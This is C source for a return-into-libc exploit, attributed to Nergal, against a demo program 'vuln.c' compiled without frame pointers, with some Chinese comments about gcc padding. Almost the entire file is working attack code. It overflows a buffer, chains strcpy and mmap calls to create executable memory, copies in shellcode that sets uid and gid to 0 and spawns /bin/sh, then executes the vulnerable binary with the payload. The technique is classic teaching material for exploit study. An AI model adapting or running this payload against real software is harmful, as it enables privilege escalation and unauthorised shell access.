/* by Nergal for vuln.c with -fomit-frame-pointer*/

#include <stdio.h>
#include <stddef.h>
#include <sys/mman.h>

#define LIBC             0x40018000
#define STRCPY           0x08048308
#define MMAP             (0x000afaf0+LIBC)
#define POPSTACK         0x80483eb
#define PLAIN_RET        0x80483ee
#define POPNUM           0x30
#define FRAMES           0xbffffe00
#define MMAP_START       0xaa011000

char hellcode[] =
    "\x90"
    "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80"
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

/* This is a stack frame of a function which takes two arguments */
struct two_arg {
        unsigned int func;
        unsigned int leave_ret;
        unsigned int param1;
        unsigned int param2;
};
struct mmap_args {
        unsigned int func;
        unsigned int leave_ret;
        unsigned int start;
        unsigned int length;
        unsigned int prot;
        unsigned int flags;
        unsigned int fd;
        unsigned int offset;
};

/* The beginning of our overflow payload.
Consumes the buffer space and overwrites %eip */
struct ov {
        char scratch[16];//在某些高版本gcc编译出来的时候会有8个bytes的垃圾，自己调整下
			 //可能以后版本的gcc会把这些垃圾利用起来
        unsigned int eip;
};

/* The second part ot the payload. Four functions will be called:
strcpy, strcpy, mmap, strcpy */
struct ourbuf {
        struct two_arg zero1;
        char pad1[8 + POPNUM - sizeof(struct two_arg)];
        struct two_arg zero2;
        char pad2[8 + POPNUM - sizeof(struct two_arg)];
        struct mmap_args mymmap;
        char pad3[8 + POPNUM - sizeof(struct mmap_args)];
        struct two_arg trans;
        char hell[sizeof(hellcode)];
};

#define PTR_TO_NULL (FRAMES+sizeof(struct ourbuf))
//#define PTR_TO_NULL 0x80484a7

main(int argc, char **argv)
{
        char lg[sizeof(struct ov) + sizeof(struct ourbuf) + 4 + 1];
        char *env[2] = { lg, 0 };
        struct ourbuf thebuf;
        struct ov theov;
        int i;

        memset(theov.scratch, 'X', sizeof(theov.scratch));

        if (argc == 2 && !strcmp("testing", argv[1])) {
                for (i = 0; i < sizeof(theov.scratch); i++)
                        theov.scratch[i] = i + 0x10;
                theov.eip = 0x05060708;
        } else {
/* To make the code easier to read, we initially return into "ret". This will
return into the address at the beginning of our "zero1" struct. */
                theov.eip = PLAIN_RET;
        }

        memset(&thebuf, 'Y', sizeof(thebuf));

        thebuf.zero1.func = STRCPY;
        thebuf.zero1.leave_ret = POPSTACK;
/* The following assignment puts into "param1" the address of the least
significant byte of the "offset" field of "mmap_args" structure. This byte
will be nullified by the strcpy call. */
        thebuf.zero1.param1 = FRAMES + offsetof(struct ourbuf, mymmap) +
            offsetof(struct mmap_args, offset);
        thebuf.zero1.param2 = PTR_TO_NULL;

        thebuf.zero2.func = STRCPY;
        thebuf.zero2.leave_ret = POPSTACK;
/* Also the "start" field must be the multiple of page. We have to nullify
its least significant byte with a strcpy call. */
        thebuf.zero2.param1 = FRAMES + offsetof(struct ourbuf, mymmap) +
            offsetof(struct mmap_args, start);
        thebuf.zero2.param2 = PTR_TO_NULL;

        thebuf.mymmap.func = MMAP;
        thebuf.mymmap.leave_ret = POPSTACK;
        thebuf.mymmap.start = MMAP_START + 1;
        thebuf.mymmap.length = 0x01020304;
/* Luckily, 2.4.x kernels care only for the lowest byte of "prot", so we may
put non-zero junk in the other bytes. 2.2.x kernels are more picky; in such
case, we would need more zeroing. */
        thebuf.mymmap.prot =
            0x01010100 | PROT_EXEC | PROT_READ | PROT_WRITE;
/* Same as above. Be careful not to include MAP_GROWS_DOWN */
        thebuf.mymmap.flags =
            0x01010200 | MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS;
        thebuf.mymmap.fd = 0xffffffff;
        thebuf.mymmap.offset = 0x01021001;

/* The final "strcpy" call will copy the shellcode into the freshly mmapped
area at MMAP_START. Then, it will return not anymore into POPSTACK, but at
MMAP_START+1.
*/
        thebuf.trans.func = STRCPY;
        thebuf.trans.leave_ret = MMAP_START + 1;
        thebuf.trans.param1 = MMAP_START + 1;
        thebuf.trans.param2 = FRAMES + offsetof(struct ourbuf, hell);

        memset(thebuf.hell, 'x', sizeof(thebuf.hell));
        strncpy(thebuf.hell, hellcode, strlen(hellcode));

        memcpy(lg , &theov, sizeof(theov));
        memcpy(lg  + sizeof(theov), &thebuf, sizeof(thebuf));
        lg[sizeof(thebuf) + sizeof(theov)] = 0;

        if (sizeof(struct ov) + sizeof(struct ourbuf)  != strlen(lg)) {
                fprintf(stderr,
                    "size=%i len=%i; zero(s) in the payload, correct it.\n",
                    sizeof(struct ov) + sizeof(struct ourbuf) ,
                    strlen(lg));
		printf("%s\n",lg);
                exit(1);
        }
        execle("./vuln.omit", "./vuln.omit",lg , NULL, 0);
}
